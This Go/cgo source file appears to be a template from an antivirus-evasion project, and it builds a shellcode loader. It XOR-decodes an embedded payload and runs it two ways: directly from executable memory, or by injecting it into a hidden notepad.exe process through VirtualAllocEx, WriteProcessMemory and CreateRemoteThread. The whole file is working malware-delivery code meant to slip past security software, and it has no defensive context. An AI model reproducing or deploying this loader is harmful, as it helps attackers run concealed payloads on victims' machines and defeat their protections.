package sc

/*
#include <stdio.h>
#include <Windows.h>
#include <tchar.h>

#define {{.HACK}} 1

#ifdef NORMAL
void sc(unsigned char *c, int c_len) {
	printf("[+] Alloc Code Memory\n");
	void *exec = VirtualAlloc(0, c_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, c, c_len);
	printf("[+] Call Code\n");
	((void(*)())exec)();
}

#elif INJECT
void sc(unsigned char *c, int c_len) {
	PROCESS_INFORMATION stProcessInfo = {0};
	STARTUPINFO stStartUpInfo = {0};
	stStartUpInfo.cb = sizeof(stStartUpInfo);

	stStartUpInfo.dwFlags |= STARTF_USESHOWWINDOW;
	stStartUpInfo.wShowWindow = SW_HIDE;
	if (!CreateProcess(NULL,_T("notepad.exe"),NULL,NULL, 0, 0, NULL, NULL, &stStartUpInfo, &stProcessInfo)) {
		printf("[-] Create Process Failed");
		return;
	}
	HANDLE hProc= OpenProcess(0x1F0FFF, 0, stProcessInfo.dwProcessId);
	if (hProc == 0) {
		printf("[-] OpenProcess Failed");
		return;
	}
	LPVOID rMem = (PTSTR)VirtualAllocEx(hProc, NULL, c_len, MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if (rMem == NULL) {
        CloseHandle(hProc);
  		printf("[-] Create Memory Failed");
		return;
 	}
	if (!WriteProcessMemory(hProc, rMem, c, c_len, NULL)) {
		CloseHandle(hProc);
  		printf("[-] Write Memory Failed");
		return;
	}

	if (CreateRemoteThread(hProc, NULL, 0,(LPTHREAD_START_ROUTINE) rMem,NULL,0, NULL) == NULL) {
  		printf("[-] Call Code Failed");
	}
	CloseHandle(hProc);
}
#else
void sc(unsigned char *c, int c_len) {
	printf("[-] Hello World!\n");
}
#endif 
*/
import "C"
import (
	"unsafe"

	"github.com/b1gcat/anti-av/utils"
)

var (
	Code = []byte{ {{.CODE}} }
)

func Hi(p func([]byte)([]byte, error)) error {
	var err error

	kek := utils.Kek(Code[4:])
	for k := range kek {
		Code[k]^= kek[k]
	}

	if Code, err = p(Code); err != nil {
		return err
	}
	C.sc((*C.uchar)(unsafe.Pointer(&Code[0])), C.int(len(Code)))
	return nil
}
